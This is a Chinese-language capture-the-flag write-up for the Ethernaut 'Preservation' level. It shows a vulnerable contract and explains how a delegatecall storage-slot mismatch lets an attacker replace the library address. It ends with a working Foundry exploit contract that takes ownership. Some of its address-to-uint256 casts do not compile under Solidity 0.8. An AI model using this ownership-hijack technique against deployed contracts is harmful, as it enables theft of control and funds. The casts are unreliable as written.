# Level 16 - Preservation

## 題目
[Preservation](https://ethernaut.openzeppelin.com/level/0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed)

### 通關條件
此智慧合約利用一個函式庫來儲存兩個不同時區的兩個不同時間。 建構函數會為每個要儲存的時間創建兩個庫實例。 本關卡的目標是獲得該合約的所有權。
### 提示
- 查閱 Solidity 文檔中的有關低階函數 delegatecall 的信息，包括其工作原理、如何用於委託操作到鏈上庫以及它對執行範圍的影響。
- 理解 delegatecall 保持上下文意味著什麼。
- 理解儲存變數如何儲存和存取。
- 理解不同資料類型之間轉換的工作原理
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
## 解題
**delegatecall** 在 [Level 6 - Delegation](https://hackmd.io/@D13/ethernaut6) 用到過，技巧就是呼叫別人的 function 改自己的變數
存變數如何儲存和存取在 [Level 8 - Vault](https://hackmd.io/@D13/ethernaut8)
不同資料類型之間轉換在 [Level 13 - Gatekeeper One](https://hackmd.io/@D13/ethernaut13)


---

先看合約，`Preservation` 在第 21, 26 行皆使用 delegatecall 的方式呼叫另一個合約 `LibraryContract` 裡的 function，但是兩個合約宣告的變數並不相同，在  [Level 6 - Delegation](https://hackmd.io/@D13/ethernaut6) 中有提到過如果要使用 delegatecall 必須要有一樣的變數（包含宣告的順序），所以當我們使用關卡合約 `Preservation` 呼叫 `LibraryContract` 中的 `setTime(uint256 _time)` 時，以 `LibraryContract` 合約來看是修改 `storedTime`；但其實修改到的是 `Preservation` 的 `timeZone1Library` （皆為合約中第一個宣告的變數）。

剛好 `Preservation` 的第一個變數 `timeZone1Library` 是儲存呼叫對象的地址，代表上述提到的 bug 會導致呼叫完 20 行的 `setFirstTime(uint256 _timeStamp)` 後，`timeZone1Library` 被改變，下次再呼叫 `setFirstTime(uint256 _timeStamp)` 時其實是呼叫到不同地址的合約。

透過這個 bug，我們的攻擊流程：
1. 設計一支帶有 `setTime(uint _newOwnerAddress)` 的惡意合約，其功能為將 owner 修改成自己
2. 呼叫 `setTime()` ，參數為我們部署的惡意合約
3. 再次呼叫 `setTime()` ，就會呼叫惡意合約的 function 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/16_Preservation.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        PreservationAttacker preservationAttacker = new PreservationAttacker(your_challenge_address);
        preservationAttacker.attack();

        vm.stopBroadcast();
    }
}

contract PreservationAttacker {
    // 用於符合題目合約的slot
    address public _timeZone1Library;
    address public _timeZone2Library;
    address public owner;
    Preservation level16;

    constructor(address _target) {
        level16 = Preservation(_target);
    }

    function attack() external {
        level16.setFirstTime(uint256(address(this)));
        level16.setFirstTime(uint256(address(msg.sender)));
    }

    function setTime(uint _newOwnerAddress) external {
        owner = address(uint160(_newOwnerAddress));
    }
}
```